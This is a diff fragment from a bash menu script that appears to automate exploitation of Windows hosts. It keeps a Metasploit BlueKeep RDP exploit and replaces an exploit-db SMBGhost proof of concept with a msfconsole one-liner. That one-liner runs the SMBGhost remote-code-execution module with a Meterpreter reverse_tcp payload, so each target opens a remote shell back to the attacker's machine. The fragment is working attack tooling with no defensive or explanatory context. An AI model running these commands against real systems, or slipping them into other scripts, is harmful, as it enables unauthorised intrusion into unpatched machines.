@@ -441,17 +441,11 @@ exploitation() {
                     msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                     ;;
                 3)
-                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching SMBGhost exploit...${RESET}"
-                    # exploit-db install paths vary between Kali releases, so resolve the
-                    # script location with searchsploit instead of hardcoding it.
-                    local smbghost_path
-                    smbghost_path="$(searchsploit -p 48537 2>/dev/null | awk -F': *' '/Path:/{print $2; exit}')"
-                    [ -f "$smbghost_path" ] || smbghost_path="/usr/share/exploitdb/exploits/windows/remote/48537.py"
-                    if [ -f "$smbghost_path" ]; then
-                        python3 "$smbghost_path" "$target"
-                    else
-                        echo -e "${DEBIAN_RED}${BOLD}[✗] EDB-48537 not found. Install exploitdb: sudo apt install exploitdb${RESET}"
-                    fi
+                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching SMBGhost (SMBv3 compression) remote exploit...${RESET}"
+                    # Remote RCE via the Metasploit module (Msf::Exploit::Remote),
+                    # same style as EternalBlue/BlueKeep above. Beats the fragile
+                    # exploit-db PoC, which carries hardcoded shellcode.
+                    msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); set payload windows/x64/meterpreter/reverse_tcp; exploit"
                     ;;
                 4)
                     echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
